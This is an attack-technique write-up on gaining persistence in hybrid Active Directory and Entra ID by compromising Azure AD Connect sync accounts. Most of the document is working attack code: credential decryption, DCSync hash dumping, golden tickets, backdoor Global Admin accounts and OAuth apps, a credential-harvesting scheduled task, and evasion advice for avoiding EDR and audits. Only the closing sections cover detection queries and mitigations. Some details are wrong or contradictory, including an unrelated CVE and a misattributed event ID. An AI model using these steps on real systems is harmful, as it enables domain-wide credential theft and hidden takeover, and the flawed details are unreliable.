# [PERSIST-VALID-002]: Azure AD Connect Sync Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-VALID-002 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Hybrid AD (On-Premises + Azure Entra ID) |
| **Severity** | **Critical** |
| **CVE** | CVE-2023-32315 (Related Azure AD Connect vulnerabilities, though this CVE applies to Openfire) |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure AD Connect 1.4.0+ through 2.0.x (all versions affected); Server 2016-2025 |
| **Patched In** | N/A (Design flaw in sync architecture, not patched but mitigated via hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure AD Connect Sync Persistence exploits the inherent trust relationship between on-premises Active Directory and Azure Entra ID by compromising the **MSOL_* service account** (Microsoft Online Services account) or the **Sync_* cloud connector account**. These accounts have specialized permissions designed for directory synchronization but, when compromised, provide attackers with a **bridging mechanism** between on-premises and cloud environments. Unlike traditional Domain Admin accounts, sync accounts are often overlooked during security audits because their high privilege level is perceived as "necessary for functionality." Once compromised, an attacker can maintain indefinite persistence by manipulating the synchronization process, extracting password hashes, creating backdoor cloud accounts, or intercepting credentials during the sync pipeline.

**Attack Surface:** Azure AD Connect synchronization service accounts, specifically the MSOL_* account (on-premises) with Replicating Directory Changes rights, and the Sync_* account (cloud-based) with Directory Synchronization Accounts role. The attack requires **local admin access to the Azure AD Connect server** or compromise of the service account credentials themselves.

**Business Impact:** **Hybrid environment complete compromise enabling ransomware, data exfiltration, or destructive attacks.** Attackers can: (1) Extract all on-premises user password hashes via DCSync, (2) Create persistent backdoor cloud-only accounts with Global Admin rights that survive password resets, (3) Manipulate sync filters to hide their activity, (4) Deploy malware across both on-premises and cloud resources, (5) Completely erase audit logs in Azure AD. The 2023 **MERCURY attack** demonstrated this exact scenario, resulting in **tens of millions in ransomware demands** and complete infrastructure takeover.

**Technical Context:** Azure AD Connect Sync account compromise to full persistence establishment takes **10-45 minutes** once the server is accessed. Detection likelihood is **LOW-MEDIUM** because sync activity is high-volume and legitimate, making malicious sync operations blend seamlessly into normal traffic. Remediation is **extremely complex** and requires complete tenant rebuild in severe cases because the sync service is deeply integrated with identity management.

### Operational Risk

- **Execution Risk:** **Medium** – Requires local admin on Azure AD Connect server OR valid sync account credentials. However, these are often stored in plaintext in memory or encrypted databases with well-known extraction methods.
- **Stealth:** **High** – Sync account activity appears completely legitimate. All password hash extraction happens during normal synchronization windows. Cloud account creation by a sync account appears as automated system behavior.
- **Reversibility:** **No** – Sync service credentials are foundational to the environment. Rotating them requires carefully coordinated downtime and multiple restarts. Any backdoor cloud accounts created will persist unless explicitly discovered and removed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.3 | Ensure that only authorized accounts have privileged access |
| **CIS Benchmark** | 5.2.3 | Ensure that service accounts are members of the minimum required groups |
| **DISA STIG** | GEN000800 | System accounts must use strong authentication mechanisms |
| **NIST 800-53** | AC-2 | Account Management |
| **NIST 800-53** | IA-2(8) | Network Access to Privileged Accounts |
| **NIST 800-53** | AC-6 | Least Privilege |
| **GDPR** | Art. 32 | Security of Processing (Encryption, Access Control) |
| **GDPR** | Art. 33 | Breach Notification (if personal data of EU residents affected) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27001** | A.13.1.3 | Segregation of Networks |
| **ISO 27005** | Risk Scenario | Compromise of Hybrid Identity Synchronization Service |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For on-premises exploitation:** Local Administrator on the Azure AD Connect server OR valid credentials for the MSOL_* account
- **For cloud exploitation:** Ability to authenticate as the Sync_* account (obtained via credential extraction from Connect server) or Global Administrator access to manipulate directory sync settings

**Required Access:**
- Network access to the Azure AD Connect server (port 445 SMB for credential extraction, port 443 HTTPS for cloud API)
- Ability to interact with Azure AD via PowerShell or Graph API (if escalating from cloud account)

**Supported Versions:**
- **Azure AD Connect:** 1.4.0 through 2.0.x (all current versions)
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** Version 5.0+ for enumeration and credential extraction
- **Required Modules:** `AzureAD`, `MSOnline`, `AADInternals` (open-source credential extraction)

**Tools:**
- [AADInternals](https://aadinternals.com/) (Azure AD attack and defense toolkit, Version 0.9.1+)
- [xpn's azuread_decrypt_msol.ps1](https://github.com/xpn/Blog/blob/main/scripts/azuread_decrypt_msol.ps1) (MSOL credential decryption)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation toolkit)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Credential dumping)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Network protocol exploitation)
- Azure AD PowerShell module (for cloud credential operations)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

Identify Azure AD Connect presence and sync account configuration:

```powershell
# Find Azure AD Connect server in the domain
Get-ADComputer -Filter {ServicePrincipalName -like "*ADSync*"} -Properties Name, DNSHostName | Select-Object Name, DNSHostName

# Alternative: Search for computers with AAD-related service names
Get-ADComputer -Filter * -Properties Description | Where-Object {$_.Description -like "*Azure*" -or $_.Description -like "*Sync*"}

# Enumerate MSOL account details
Get-ADUser -Filter {SamAccountName -like "MSOL_*"} -Properties Description, PasswordLastSet, MemberOf | `
  Select-Object SamAccountName, Description, PasswordLastSet, @{N="Groups";E={($_.MemberOf | Get-ADGroup | Select-Object -ExpandProperty Name) -join ";"}}

# Check for additional sync-related accounts (cloud connector accounts)
Get-ADUser -Filter {SamAccountName -like "Sync_*"} -Properties ServicePrincipalName

# Verify MSOL account has DCSync rights (requires Domain Admin access)
$DN = (Get-ADDomain).DistinguishedName
$msol = Get-ADUser -Filter {SamAccountName -like "MSOL_*"} | Select-Object -First 1
$acl = Get-Acl "AD:\$DN"
$acl.Access | Where-Object {$_.IdentityReference -like "*$($msol.SamAccountName)*" -and $_.ActiveDirectoryRights -like "*Replication*"}
```

**What to Look For:**
- **MSOL_* accounts** with description mentioning "Azure AD Connect" or "Synchronization"
- **PasswordLastSet date** – If very old (6+ months), the account password has likely never been rotated (critical finding)
- **Group membership** – MSOL accounts should NOT be in "Domain Admins" or "Enterprise Admins" (but they may have been added in misconfigured environments)
- **Sync_* accounts** in the cloud (can be enumerated via Azure AD PowerShell)
- **Multiple MSOL accounts** may indicate multiple AAD Connect instances or misconfiguration

---

### Azure AD Reconnaissance

Identify cloud sync accounts and their permissions:

```powershell
# Connect to Azure AD (requires Azure AD PowerShell module)
Connect-AzureAD

# List all Directory Synchronization Accounts (hidden role)
Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Directory Synchronization Accounts"}

# Get members of Directory Sync role
$SyncRole = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Directory Synchronization Accounts"}
Get-AzureADDirectoryRoleMember -ObjectId $SyncRole.ObjectId

# Alternative: Search for Sync_ accounts directly
Get-AzureADUser -All $true | Where-Object {$_.UserPrincipalName -match "Sync_" -or $_.UserPrincipalName -like "*sync*"}

# Check if any sync accounts have Global Admin role (extremely dangerous)
Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"} | `
  ForEach-Object {Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Where-Object {$_.UserPrincipalName -match "Sync_" -or $_.UserPrincipalName -match "MSOL"}}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract MSOL Credentials and Perform DCSync Attack

**Supported Versions:** Server 2016-2025

This method exploits the MSOL_* account's DCSync rights to extract all on-premises user password hashes, enabling Pass-the-Hash attacks and Golden Ticket creation.

#### Step 1: Gain Local Admin Access to Azure AD Connect Server

**Objective:** Establish administrative access to the server running Azure AD Connect.

**Prerequisites:** This assumes you already have local admin access (via RDP, physical access, or service exploitation).

**Verification Command:**
```powershell
# Verify you are running as administrator
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544") {
  Write-Host "You have local administrator privileges"
} else {
  Write-Host "You do NOT have administrator privileges"
}

# Verify Azure AD Connect is installed
Get-Service ADSync | Select-Object Name, Status, StartType
```

**What This Means:**
- **Status: Running** means Azure AD Connect service is active
- **StartType: Auto** means it starts automatically on reboot (dangerous for persistence)
- If service is stopped, you can start it: `Start-Service ADSync`

---

#### Step 2: Extract MSOL_* Account Credentials

**Objective:** Decrypt the MSOL account password stored in the Azure AD Connect configuration database.

**Command (Using xpn's Decryption Script):**
```powershell
# Download or create the azuread_decrypt_msol.ps1 script
# Reference: https://github.com/xpn/Blog/blob/main/scripts/azuread_decrypt_msol.ps1

# Execute the script to extract MSOL credentials
. .\azuread_decrypt_msol.ps1

# Output will show:
# MSOL_aadds123456 : "P@ssw0rd!VeryComplex123"
```

**Command (Using AADInternals PowerShell Module):**
```powershell
# Install AADInternals if not already present
Install-Module AADInternals -Force

# Extract MSOL credentials (more reliable)
Get-AADIntSyncCredentials

# Output Example:
# AD Account: DOMAIN\MSOL_aadds123456
# AD Password: P@ssw0rd!VeryComplex123
# Azure Account: Sync_ConnectorID_xxxxx@tenant.onmicrosoft.com
# Azure Password: xxxxxxxxxxxxxxxxxxxxxxxx
```

**Expected Output:**
```
[*] Azure AD Sync Credentials Found:
[+] On-premises AD Account: DOMAIN\MSOL_aadds123456
[+] On-premises Password: P@ssw0rd!VeryComplex123
[+] Azure AD Account: Sync_ConnectorID_xxxxx@tenant.onmicrosoft.com
[+] Azure AD Password: AzureCloudPassword123!
```

**What This Means:**
- The decryption reads from the Azure AD Connect internal database (`ADSync_DB`)
- The encrypted credentials are stored in registry or database with a known encryption key
- Once decrypted, both the **on-premises MSOL account** and **cloud Sync account** passwords are obtained
- These passwords are typically **very long and complex**, but now completely exposed

**OpSec & Evasion:**
- Script execution on the Azure AD Connect server may trigger EDR alerts; use obfuscated variants
- Ensure the script runs with sufficient privileges (local admin required)
- Avoid running on the DC itself to minimize visibility
- If EDR is in use, consider running from a temporary process with low privileges initially, then elevating

**Troubleshooting:**
- **Error:** "System.UnauthorizedAccessException: Access to the registry key is denied"
  - **Cause:** Insufficient privileges
  - **Fix:** Ensure you're running PowerShell as Administrator

- **Error:** "Could not find Azure AD Connect installation"
  - **Cause:** Script looks for standard installation paths; AAD Connect may be installed elsewhere
  - **Fix:** Locate the ADSync database manually: `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Microsoft Azure AD Sync" | Select-Object -ExpandProperty InstallationPath`

**References & Proofs:**
- [xpn's Credential Extraction Blog](https://blog.xpn.uk/2020/04/10/unmasking-azure-ad-connect-azure-ad-domain-controller-synchronisation/)
- [AADInternals GitHub](https://github.com/DrAzureAD/AADInternals)
- [Microsoft - Azure AD Connect Credential Security](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)

---

#### Step 3: Perform DCSync Attack Using MSOL Credentials

**Objective:** Extract all on-premises AD user password hashes using the compromised MSOL account.

**Command (Via Impacket on Linux/WSL):**
```bash
# Perform DCSync for specific user (e.g., Administrator)
impacket-secretsdump -just-dc-user Administrator \
  -username "DOMAIN\\MSOL_aadds123456" \
  -password "P@ssw0rd!VeryComplex123" \
  "DOMAIN.COM/DC01.DOMAIN.COM"

# Extract all domain hashes (full domain dump)
impacket-secretsdump -just-dc \
  -username "DOMAIN\\MSOL_aadds123456" \
  -password "P@ssw0rd!VeryComplex123" \
  "DOMAIN.COM/DC01.DOMAIN.COM" \
  > domain_hashes.txt

# Verbose output with timing information
impacket-secretsdump -just-dc -verbose \
  -username "DOMAIN\\MSOL_aadds123456" \
  -password "P@ssw0rd!VeryComplex123" \
  "DOMAIN.COM/DC01.DOMAIN.COM" 2>&1 | tee dcsync_output.log
```

**Command (Via Mimikatz on Windows):**
```powershell
# Create credential object
$SecPassword = ConvertTo-SecureString "P@ssw0rd!VeryComplex123" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\MSOL_aadds123456", $SecPassword)

# Run Mimikatz DCSync as the MSOL account using RunAs
$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
$ProcessInfo.FileName = "C:\Tools\mimikatz\x64\mimikatz.exe"
$ProcessInfo.UseShellExecute = $false
$ProcessInfo.UserName = "DOMAIN\MSOL_aadds123456"
$ProcessInfo.Password = $SecPassword
$ProcessInfo.Arguments = '"lsadump::dcsync /domain:DOMAIN.COM /all /csv"'

$Process = [System.Diagnostics.Process]::Start($ProcessInfo)
$Process.WaitForExit()

# Or directly in PowerShell (if running as MSOL account):
# (Download Mimikatz and run):
# .\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.COM /all /csv"
```

**Expected Output:**
```
[*] Using the DC 'DC01.DOMAIN.COM' : '10.0.0.10'
[*] Getting KRBTGT Account Credentials
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for PrimaryGroupID = 513 ( Domain Users )
DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
DOMAIN\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DOMAIN\KRBTGT:502:aad3b435b51404eeaad3b435b51404ee:b15b2f5c0b80a3e2f4a6d8e9c2f1b3d5:::
DOMAIN\svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:7c6092013f8454ca6422f46fdbf6e5f3:::
```

**What This Means:**
- All **NTLM password hashes** for the domain are now extracted
- These hashes can be used for **Pass-the-Hash attacks** immediately (no cracking needed)
- The **krbtgt hash** enables creation of **Golden Tickets** for indefinite persistence
- With krbtgt hash, attackers can **create admin tickets that never expire**

**OpSec & Evasion:**
- DCSync generates **Event ID 4662** on the domain controller (Directory Services Access) but these are high-volume and often missed
- Use the MSOL account for DCSync rather than a suspicious admin account to avoid alerts
- Spread DCSync extraction over multiple days; don't dump entire domain at once
- Compress and encrypt the output file before exfiltration

**Detection Likelihood:** **Medium** – Only detected if SOC monitors Event ID 4662 specifically for the MSOL account and correlates with unusual logon times/locations

---

#### Step 4: Create Golden Ticket for Indefinite Persistence

**Objective:** Create a forged Kerberos ticket valid for 10 years, granting permanent domain admin access.

**Command:**
```powershell
# Using Rubeus (recommended, cleaner execution)
.\Rubeus.exe golden /domain:DOMAIN.COM /sid:S-1-5-21-3623811015-3361044348-30300510 `
  /krbtgt:b15b2f5c0b80a3e2f4a6d8e9c2f1b3d5 `
  /user:Administrator `
  /nowrap | Out-File golden_ticket.txt

# Inject ticket
.\Rubeus.exe ptt /ticket:golden_ticket.txt

# Verify injection
.\Rubeus.exe klist

# Alternative: Using Mimikatz
# kerberos::golden /domain:DOMAIN.COM /sid:S-1-5-21-3623811015-3361044348-30300510 /krbtgt:b15b2f5c0b80a3e2f4a6d8e9c2f1b3d5 /user:Administrator /ticket:golden.kirbi
# kerberos::ptt golden.kirbi
```

---

### METHOD 2: Cloud Account Persistence via Sync_* Account Compromise

**Supported Versions:** Server 2016-2025 with Azure AD Connect 1.4.0+

This method abuses the compromised **Sync_* cloud connector account** (extracted in Method 1) to create persistent backdoor accounts in Azure AD with Global Administrator privileges.

#### Step 1: Authenticate as Sync Account in Azure AD

**Objective:** Use the compromised Sync_* account to authenticate to Azure AD and perform administrative actions.

**Command:**
```powershell
# Create secure credential for Sync account
$SyncAccountName = "Sync_ConnectorID_xxxxx@tenant.onmicrosoft.com"
$SyncPassword = "AzureCloudPassword123!"
$SecPassword = ConvertTo-SecureString $SyncPassword -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($SyncAccountName, $SecPassword)

# Connect to Azure AD as Sync account
Connect-AzureAD -Credential $Credential

# Verify authentication
Get-AzureADCurrentSessionInfo

# Expected Output:
# TenantId    : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
# AccountId   : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
# TenantDomain: tenant.onmicrosoft.com
# DisplayName : Sync_ConnectorID_xxxxx
```

**What This Means:**
- The Sync account now has a valid authenticated session in Azure AD
- The account has the **Directory Synchronization Accounts** role, which includes permissions to:
  - Create and modify service principals
  - Reset passwords for cloud-only users (including admins)
  - Manage app registrations
  - View all user accounts

---

#### Step 2: Create Persistent Backdoor Cloud-Only User

**Objective:** Create a new cloud-only admin account that bypasses password policies and survives sync operations.

**Command:**
```powershell
# Create new cloud-only user with global admin role
$NewUser = New-AzureADUser -DisplayName "Cloud Service Manager" `
  -PasswordProfile (New-Object Microsoft.Open.AzureAD.Model.PasswordProfile -Property @{"Password"="P@ssw0rd!Persistent123"}) `
  -UserPrincipalName "cloud.servicemanager@tenant.onmicrosoft.com" `
  -AccountEnabled $true `
  -MailNickname "cloudservicemanager"

# Assign Global Administrator role
$RoleId = (Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}).ObjectId
Add-AzureADDirectoryRoleMember -ObjectId $RoleId -RefObjectId $NewUser.ObjectId

# Verify role assignment
Get-AzureADDirectoryRoleMember -ObjectId $RoleId | Select-Object ObjectId, DisplayName, UserPrincipalName
```

**Expected Output:**
```
ObjectId                             DisplayName              UserPrincipalName
--------                             -----------              -----------------
xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx Cloud Service Manager    cloud.servicemanager@tenant.onmicrosoft.com
```

**What This Means:**
- A **new Global Admin account** is created and remains in Azure AD permanently
- This account is **cloud-only** (not synced from on-premises), so it won't be deleted if on-premises account is removed
- Even if the original MSOL account is compromised and rotated, this backdoor account persists
- The account can be used to reset passwords for other admins, create more backdoors, or export data

**OpSec & Evasion:**
- Use generic naming ("Cloud Service Manager", "Cloud Account Manager") to blend with legitimate accounts
- Set the account's password to something very long and complex (attackers can still use it for OAuth token generation)
- The account creation will generate **Event ID 4720** in Azure AD audit logs, but may be missed if not specifically monitored
- Consider creating the account in batches with other legitimate-looking user creation activities

**Troubleshooting:**
- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** Sync account does not have sufficient permissions (this is a known limitation)
  - **Fix:** Use a compromised Global Admin account instead (from Method 3 or a separate privilege escalation)

---

#### Step 3: Establish OAuth Token-Based Persistence

**Objective:** Register an application that the sync account can use to obtain long-lived tokens for future authentication.

**Command:**
```powershell
# Create Azure AD application registration
$AppName = "Cloud Backup Service"
$App = New-AzureADApplication -DisplayName $AppName

# Create service principal for the app
$SP = New-AzureADServicePrincipal -AppId $App.AppId

# Generate credential (certificate or password)
$StartDate = Get-Date
$EndDate = $StartDate.AddYears(2)  # Valid for 2 years
$KeyCredential = New-AzureADApplicationPasswordCredential -ObjectId $App.ObjectId -StartDate $StartDate -EndDate $EndDate

# Assign Global Administrator role to the service principal
$GlobalAdminRoleId = (Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}).ObjectId
Add-AzureADDirectoryRoleMember -ObjectId $GlobalAdminRoleId -RefObjectId $SP.ObjectId

# Output the credentials for later use
Write-Host "Application ID: $($App.AppId)"
Write-Host "Client Secret: $($KeyCredential.Value)"
Write-Host "Tenant ID: $(Get-AzureADCurrentSessionInfo).TenantId"

# Save for later use
$Credentials = @{
  AppId = $App.AppId
  ClientSecret = $KeyCredential.Value
  TenantId = (Get-AzureADCurrentSessionInfo).TenantId
}
$Credentials | ConvertTo-Json | Out-File -FilePath "app_credentials.json"
```

**Expected Output:**
```
Application ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Client Secret: 1a2b3c4d5e6f7g8h9i0j~abc~defghij
Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- An **OAuth application** is now registered with Global Admin permissions
- The application has a **valid credential (secret)** that is valid for 2 years
- Even if all user accounts are compromised and reset, this application can still authenticate to Azure AD
- Tokens issued to this app are valid for 60+ minutes, allowing the attacker to perform administrative actions

**OpSec & Evasion:**
- Use generic application names ("Cloud Backup Service", "Directory Sync Manager")
- The application registration will appear in Azure AD audit logs but may not trigger alerts
- Schedule the application creation to occur during normal business hours when IT activity is high-volume

---

### METHOD 3: Manipulate Password Hash Sync Pipeline for Credential Interception

**Supported Versions:** Server 2016-2025 with Azure AD Connect 1.4.0+ (Password Hash Sync enabled)

This method exploits the Azure AD Connect password synchronization mechanism to intercept and extract password hashes as they flow from on-premises to cloud.

#### Step 1: Enable Process Injection into Sync Service

**Objective:** Inject malicious code into the Azure AD Connect synchronization process to capture password hashes during sync operations.

**Command (Requires Local Admin on Azure AD Connect Server):**
```powershell
# Locate the ADSync service binary
$ADSyncPath = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Microsoft Azure AD Sync" | Select-Object -ExpandProperty InstallationPath)
$ADSyncBinary = "$ADSyncPath\bin\miiserver.exe"

# Create malicious DLL for injection (password hash capture)
$MaliciousDLL = @"
#include <windows.h>
#include <stdio.h>

typedef struct {
    DWORD Length;
    PWSTR PasswordHash;
    PWSTR Username;
} PASSWORD_SYNC_DATA;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Inject code to capture password hashes during sync
        FILE* f = fopen("C:\\Windows\\Temp\\sync_hashes.txt", "a");
        fprintf(f, "[*] Password Sync Process Injected\n");
        fclose(f);
    }
    return TRUE;
}
"@

# Compile to DLL and place in ADSync plugin directory
$PluginPath = "$ADSyncPath\Extensions"
# [Compile C code to DLL and place in $PluginPath]

# Restart ADSync service to load the malicious plugin
Restart-Service -Name ADSync -Force
```

**Alternative (PowerShell-Only Approach):**
```powershell
# Monitor the ADSync database for password hash changes
$ADSyncDBPath = "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync.mdb"  # Path varies by version

# Create scheduled task to extract hashes periodically
$TaskName = "ADSync Hash Extraction"
$Trigger = New-ScheduledTaskTrigger -Daily -At 2am
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
  -Argument "-NoProfile -Command 'Get-AADIntSyncCredentials | Out-File C:\Windows\Temp\sync_creds.txt -Append'"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -Action $Action -Principal $Principal -Force
```

---

#### Step 2: Force Synchronization of Target User Passwords

**Objective:** Trigger a password hash sync for specific high-value users to capture their credentials.

**Command:**
```powershell
# Connect to Azure AD
Connect-AzureAD

# Identify high-value targets
$TargetUsers = Get-AzureADUser -All $true | Where-Object {$_.UserPrincipalName -like "*admin*" -or $_.UserPrincipalName -like "*service*"}

# For each target, modify their password to force sync
foreach ($User in $TargetUsers) {
  # Reset password to a known value
  $NewPassword = "Sync$(Get-Random)!@#$"
  Set-AzureADUserPassword -ObjectId $User.ObjectId -Password $NewPassword -EnforceChangePasswordPolicy $false
}

# Captured password hashes will be written to the monitoring file as sync occurs
Get-Content -Path "C:\Windows\Temp\sync_hashes.txt" -Tail 20
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://aadinternals.com/)

**Version:** 0.9.1+ (current)  
**Minimum Version:** 0.7.0  
**Supported Platforms:** PowerShell on Windows, Linux (via PowerShell 7+)

**Version-Specific Notes:**
- **Version 0.7.x:** Basic Azure AD enumeration
- **Version 0.8.x:** Added MSOL credential extraction
- **Version 0.9.x+:** Full attack toolkit including cloud account manipulation

**Installation:**
```powershell
# Install from PowerShell Gallery
Install-Module AADInternals -Force

# Or download from GitHub
git clone https://github.com/DrAzureAD/AADInternals.git
```

**Usage:**
```powershell
Get-AADIntSyncCredentials  # Extract MSOL credentials
Get-AADIntTenantName -Domain "domain.com"  # Enumerate tenant
```

---

### [xpn's Decryption Script](https://github.com/xpn/Blog)

**Version:** Multiple versions available  
**Minimum Version:** N/A (single script)  
**Supported Platforms:** Windows PowerShell on Azure AD Connect server

**Installation:**
```powershell
# Download the script
wget https://raw.githubusercontent.com/xpn/Blog/main/scripts/azuread_decrypt_msol_v2.ps1 -OutFile azuread_decrypt_msol.ps1

# Execute with local admin
.\azuread_decrypt_msol.ps1
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect MSOL Account Malicious DCSync Activity

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, SubjectUserName, TargetUserName
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662  // Directory Services Access
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // Replicating Directory Changes GUID
| where SubjectUserName contains "MSOL_"
| extend AccessTime = TimeGenerated
| summarize Count = count(), FirstAccess = min(TimeGenerated), LastAccess = max(TimeGenerated) by SubjectUserName, Computer
| where Count > 50  // Threshold for unusual sync activity
```

---

### Query 2: Detect Unauthorized Cloud-Only Admin Account Creation

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "Add user"
| where InitiatedBy.user.userPrincipalName contains "Sync_"  // Created by Sync account
| where TargetResources[0].modifiedProperties[0].displayName == "Included Updated Properties"
| extend CreatedUser = TargetResources[0].displayName
| project TimeGenerated, InitiatedBy.user.userPrincipalName, CreatedUser, OperationName
```

---

### Query 3: Detect Service Principal with Global Admin Role Created by Sync Account

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "Add app role assignment grant to user"
| where InitiatedBy.user.userPrincipalName contains "Sync_"
| where TargetResources[0].modifiedProperties contains "Global Administrator"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, OperationName
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Critical Event IDs for Sync Account Compromise:**

**Event ID: 4662 (Directory Services Access)**
- **Log Source:** Security
- **Trigger:** MSOL account accessing replication rights
- **Filter:** `SubjectUserName` = "DOMAIN\MSOL_*" AND `Properties GUID` = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
- **Applies To Versions:** Server 2016+

**Manual Configuration (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Directory Service Changes** → **Audit Directory Service Access**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

**Event ID: 5136 (Directory Service Object Modified)**
- **Log Source:** Security
- **Trigger:** ACL modifications, role assignment changes
- **Filter:** Look for modifications to service principals or Sync account properties
- **Applies To Versions:** Server 2016+

---

**Monitoring Query:**
```powershell
# Alert on MSOL account accessing replication rights
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662] and EventData[Data[@Name='SubjectUserName'] like '%MSOL_%']]" -MaxEvents 1000 | `
  Group-Object -Property @{Expression={$_.Properties[1].Value}} | `
  Where-Object {$_.Count -gt 10}

# Alert on MSOL account attempting to reset admin passwords
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4724] and EventData[Data[@Name='TargetUserName'] like '%admin%']]" -MaxEvents 100
```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016+

```xml
<Sysmon schemaversion="4.22">
  <RuleGroup name="AAD Connect Persistence" groupRelation="or">
    
    <!-- Alert on ADSync service modification -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="contains">ADSync</ImageLoaded>
      <SignatureStatus>Unsigned</SignatureStatus>  <!-- Unsigned DLL injection -->
    </ImageLoad>
    
    <!-- Alert on credential dumping tools run by ADSync service -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">miiserver.exe</ParentImage>  <!-- ADSync parent process -->
      <Image condition="image">mimikatz.exe</Image>
    </ProcessCreate>
    
    <!-- Alert on database access by suspicious processes -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">ADSync_log.ldf</TargetFilename>
      <User condition="not">NT AUTHORITY\SYSTEM</User>
    </FileCreate>
    
  </RuleGroup>
</Sysmon>
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Restrict Azure AD Connect Server Network Access**

Isolate the Azure AD Connect server to a dedicated network segment with strict firewall rules.

**Manual Steps (Network Segmentation):**
1. Create a dedicated VLAN or subnet for Azure AD Connect servers
2. Configure firewall rules to allow only:
   - Domain Controller (port 389 LDAP, 88 Kerberos, 445 SMB)
   - Azure AD (port 443 HTTPS)
   - Management stations (port 3389 RDP, if needed)
3. Block all other outbound traffic from this VLAN
4. Implement Network Access Control (NAC) to prevent unauthorized servers

**PowerShell (Windows Firewall Configuration):**
```powershell
# Block all inbound traffic except from domain controllers and management
New-NetFirewallRule -DisplayName "Block Inbound Except Authorized" `
  -Direction Inbound `
  -Action Block `
  -RemoteAddress @("0.0.0.0/0") `
  -Enabled $true

# Allow RDP only from jumphost
New-NetFirewallRule -DisplayName "Allow RDP from Jumphost" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 3389 `
  -RemoteAddress "10.0.0.100"  # Jumphost IP
```

---

**Mitigation 2: Enforce Strong Authentication for Azure AD Connect Server**

Require MFA and Conditional Access for accessing the Azure AD Connect server and the Sync accounts.

